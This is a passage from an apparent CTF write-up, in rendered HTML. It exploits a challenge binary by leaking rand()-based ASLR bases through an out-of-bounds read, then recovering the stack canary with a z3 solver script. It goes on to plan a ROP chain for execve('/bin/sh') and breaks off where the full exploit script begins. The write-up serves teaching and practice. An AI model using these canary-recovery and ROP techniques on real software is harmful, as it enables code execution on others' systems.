</span></span><span class="line"><span class="cl">0x0000f900002000 0x0000f900003000 0x00000000000000 r-- 
</span></span><span class="line"><span class="cl">0x007ffff7ff7000 0x007ffff7ff8000 0x00000000000000 r-x 
</span></span><span class="line"><span class="cl">0x007ffff7ff8000 0x007ffff7ff9000 0x00000000000000 rw- 
</span></span><span class="line"><span class="cl">0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
</span></span><span class="line"><span class="cl">0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
</span></span><span class="line"><span class="cl">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
</span></span><span class="line"><span class="cl">0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Yes it is. Notice that most of the region addresses&rsquo; first 12-bits in the vmmap is our <code>rand()</code> result. Now, our goal is to recover these addresses via the OOB bug.</p>
<p>Playing around the gdb, we notice that putting <code>512</code> as the scoreboard offset will leak our <code>1st</code> rand result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Which place&#39;s score do you want to see (0-9)?
</span></span><span class="line"><span class="cl">512
</span></span><span class="line"><span class="cl">To get this place you need to beat this score: 287494381664
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">In [260]: hex(287494381664)
</span></span><span class="line"><span class="cl">Out[260]: &#39;0x42f0002060&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the first 12-bits of the number are the <code>rand()</code> result (Specifically the first <code>rand()</code> result after <code>rand_state = canary</code>). So basically our goal is with this OOB, we will try to leak all the aslr addresses generated by the <code>rand()</code> method.</p>
<p>Also, we actually can use a negative index. But we need to convert it to unsigned first. For example, if you want to put <code>-1</code>, then send <code>2**64-1</code> as the offset value.</p>
<p>After playing throughout the gdb, we notice a consistent pattern on each run, which we will explain below:</p>
<ul>
<li>Offset 512 -&gt; Leak the 1st rand() result (<code>base_1</code> region address)</li>
<li>Offset -1017 -&gt; Leak the 3rd rand() result (<code>base_3</code> region address)</li>
<li>Offset -1019 -&gt; Leak the 5th rand() result (<code>base_5</code> region address)</li>
<li>After leaking the 5th rand(), we notice that the address region started with the 5th <code>rand()</code>&rsquo;s value contains the 4th and 6th <code>rand()</code>&rsquo;s results. So subtracting the 5th leaked address with the 1st leaked address can leak the 4th and 6th <code>rand()</code> value.</li>
<li>After leaking the 4th <code>rand()</code>, we notice that the address region started with the 4th <code>rand()</code>s value contains the 2nd <code>rand()</code> result. So subtracting the 4th leaked with the 1st leaked can leak the 2nd <code>rand()</code> value.</li>
</ul>
<p>You can see my shared script later if you&rsquo;re quite confused, but, basically, with correct OOB offsets, we managed to leak the first 6 of the aslr addresses where the first 12-bit of each address is generated by <code>rand()</code>.</p>
<h4 id="recover-canary-value">Recover <code>canary</code> value</h4>
<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just translate the <code>rand()</code> method to python and put it in <code>z3</code> 😂. <code>z3</code> is an SMT solver. Given some constraints, it will try to check whether any solution that can satisfy the constraints exists or not.</p>
<p>In this case, the constraints that we will use are the leaked <code>rand()</code> values, while the solution that we try to find is a 64-bit number (which is the <code>rand_state</code>). So, what we can do is simply re-write the <code>rand()</code> algorithm that we see in the decompiled result to python, and then try to construct the constraints for our target solution (<code>rand_state</code>) by adding equality constraint, where each <code>rand()</code> call result need to be equal to our leaked value.</p>
<p>Here is the sample POC, where we will use the previous value that we get from GDB.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Sanity check</span>
</span></span><span class="line"><span class="cl"><span class="n">real_canary</span> <span class="o">=</span> <span class="mh">0x75924ac4cc2d256a</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states7</span> <span class="o">=</span> <span class="mh">0xf0b</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># For POC, we will use only 6 of the rand() values, because we can only recover 6 rand() values</span>
</span></span><span class="line"><span class="cl"><span class="c1"># based on previous analysis</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x42f</span><span class="p">,</span> <span class="mh">0xf90</span><span class="p">,</span> <span class="mh">0x97e</span><span class="p">,</span> <span class="mh">0x7ab</span><span class="p">,</span> <span class="mh">0xc92</span><span class="p">,</span> <span class="mh">0x6fe</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Rand state is a 64-bit value</span>
</span></span><span class="line"><span class="cl"><span class="n">rand_state</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand_extract_bit</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">rand_state</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">rand_state</span> <span class="o">&gt;&gt;</span> <span class="n">a</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand_get_bit</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">rand_state</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3F</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rand_state</span> <span class="o">=</span> <span class="p">((</span><span class="n">rand_state</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">))</span> <span class="o">|</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">rand_get_bit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setting constraints, where each rand() call result</span>
</span></span><span class="line"><span class="cl"><span class="c1"># should be the same as the leaked rand() values</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">known_state</span> <span class="ow">in</span> <span class="n">known_states</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="n">known_state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Solve the equations with z3 by checking whether the solver</span>
</span></span><span class="line"><span class="cl"><span class="c1"># can satisfy the constraint</span>
</span></span><span class="line"><span class="cl"><span class="n">recovered_canary</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># If yes, that mean z3 found the solution, which basically our</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># canary value.</span>
</span></span><span class="line"><span class="cl">    <span class="n">model</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_canary</span> <span class="o">=</span> <span class="n">model</span><span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check whether the recoverd rand_state (canary) is the same as what</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we got from GDB value.</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Known states    : </span><span class="si">{</span><span class="n">known_states</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Real canary     : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">real_canary</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Recovered canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">recovered_canary</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now we have recovered the canary (rand_state), let&#39;s calculate</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the address of the 7th rand() result. Inspecting via gdb, this</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 7th address contains a lot of useful gadgets.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Recover 7th address</span>
</span></span><span class="line"><span class="cl"><span class="n">rand_state</span> <span class="o">=</span> <span class="n">recovered_canary</span>
</span></span><span class="line"><span class="cl"><span class="n">recovered_known_state7</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_known_state7</span> <span class="o">=</span> <span class="n">rand</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check whether thhe recovered 7th rand() value is the same as what</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we got from GDB value.</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Real Addr 7th   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">known_states7</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Recovered Addr  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">recovered_known_state7</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Executing the above POC will be proof that z3 is able to recover the <code>canary</code> value. Also after we recovered the initial <code>rand_state</code>, we can simply get the 7th <code>rand()</code> by calling <code>rand()</code> 7 times. This will be useful later! Below is the POC result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Known states    : [1071, 3984, 2430, 1963, 3218, 1790]
</span></span><span class="line"><span class="cl">[*] Real canary     : 0x75924ac4cc2d256a
</span></span><span class="line"><span class="cl">[*] Recovered canary: 0x75924ac4cc2d256a
</span></span><span class="line"><span class="cl">[*] Real Addr 7th   : 0xf0b
</span></span><span class="line"><span class="cl">[*] Recovered Addr  : 0xf0b
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE</h4>
<p>Now we have POC to recover our canary value, we can use the BOF bug to perform RCE by overwriting the saved return pointer. One of the common techniques to achieve RCE via BOF is called return oriented programming (<a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener noreffer ">ROP</a>).</p>
<p>What we need to do is, because we control the stack due to the buffer overflow bug, we will try to carefully choose some available instructions in the binary (called <code>gadgets</code>), which can be used to build our shellcode. Usually, what we&rsquo;re looking for is an instruction that can pop a stack value (which we can control) to chosen register (such as <code>rdi</code>, <code>rsp</code>, <code>rsi</code>, <code>rax</code>, etc.), and it usually ends with <code>ret</code> instruction, so that we can jump to another chosen instruction that we have put in the stack.</p>
<p>For example, imagine that we have a buffer overflow bug in method X:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Now because of our malicious input, the stack layout become like below:
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| aaaaaaaa                         | &lt;- RSP, top of stack
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| ........                         |
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| Saved RBP                        | &lt;- RBP
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| Address of gadget &#34;pop rdi; ret&#34; | &lt;- Stack Return Pointer address after being overwritten
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| desired rdi value                |
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| Address of gadget &#34;syscall&#34;      |
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">When the method X is finished and want to jump to the previous callee by calling `leave; ret;`, the stack flow will be like below:
</span></span><span class="line"><span class="cl">After &#34;leave&#34;, stack will be like below:
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| Address of gadget &#34;pop rdi; ret&#34; | &lt;- RSP. Stack Return Pointer address after being overwritten
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| desired rdi value                | &lt;- This value will be popped to rdi
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| Address of gadget &#34;syscall&#34;      |
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">During executing &#34;ret&#34;, program will do &#34;pop rip&#34;, which basically make the program jump
</span></span><span class="line"><span class="cl">to the address stored in top of stack, which is &#34;pop rdi; ret&#34;. Now the stack is like below:
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| desired rdi value                | &lt;- RSP. This value will be popped to rdi
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| Address of gadget &#34;syscall&#34;      |
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Now, during executing &#34;pop rdi&#34;, it will pop top of stack to rdi. Now stack is like below:
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| Address of gadget &#34;syscall&#34;      | &lt;- RSP. Next return pointer address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">And now, &#34;ret&#34; will do &#34;pop rip&#34;, which make the program jump to the stored address
</span></span><span class="line"><span class="cl">in RSP , which is syscall.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Now, We finally able to do RCE leveraging BOF bug.
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see in the above example, with buffer overflow, we can do RCE via ROP to execute our desired execution.</p>
<p>So, the last step is only to build a ROP chain. Inspecting via gdb, we notice that the 7th <code>rand()</code> address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We also notice in the 2nd <code>rand()</code> address region, there is <code>syscall</code> gadget.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Lot of useful gadgets found in 7th address region
</span></span><span class="line"><span class="cl">gef➤  x/25i 0x00000f0b001000
</span></span><span class="line"><span class="cl">   0xf0b001000:	push   rdi
</span></span><span class="line"><span class="cl">   0xf0b001001:	pop    rdi
</span></span><span class="line"><span class="cl">   0xf0b001002:	ret    
</span></span><span class="line"><span class="cl">   0xf0b001003:	push   rdi
</span></span><span class="line"><span class="cl">   0xf0b001004:	pop    rsi
</span></span><span class="line"><span class="cl">   0xf0b001005:	ret    
</span></span><span class="line"><span class="cl">   0xf0b001006:	push   rdi
</span></span><span class="line"><span class="cl">   0xf0b001007:	pop    rax
</span></span><span class="line"><span class="cl">   0xf0b001008:	ret
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Syscall found in 2nd address region
</span></span><span class="line"><span class="cl">gef➤  x/10i 0x0000f900001000
</span></span><span class="line"><span class="cl">   0xf900001000:	mov    eax,edi
</span></span><span class="line"><span class="cl">   0xf900001002:	syscall 
</span></span><span class="line"><span class="cl">   0xf900001004:	ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>We plan to use these gadgets to do syscall <code>execve('/bin/sh')</code>. The rough plan is to build a ROP chain to do this:</p>
<ul>
<li>pop &ldquo;/bin/sh\x00&rdquo; pointer to <code>rdi</code></li>
<li>pop null to <code>rsi</code></li>
<li>pop <code>execve</code> syscall number (0x3b) to <code>rax</code></li>
<li>call <code>syscall</code></li>
</ul>
<h3 id="solution">Solution</h3>
<p>Following the above exploitation plan, below is the full script that I used to execute the plan. I&rsquo;ve provided detailed comments to explain what the script does.</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Notes that sometimes z3 couldn&rsquo;t recover the correct <code>canary</code> value, but we simply retry it, and at somepoint, it will be able to recover the correct <code>canary</code>.</div>
        </div>
    </div>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span></code></pre></td>
<td class="lntd">
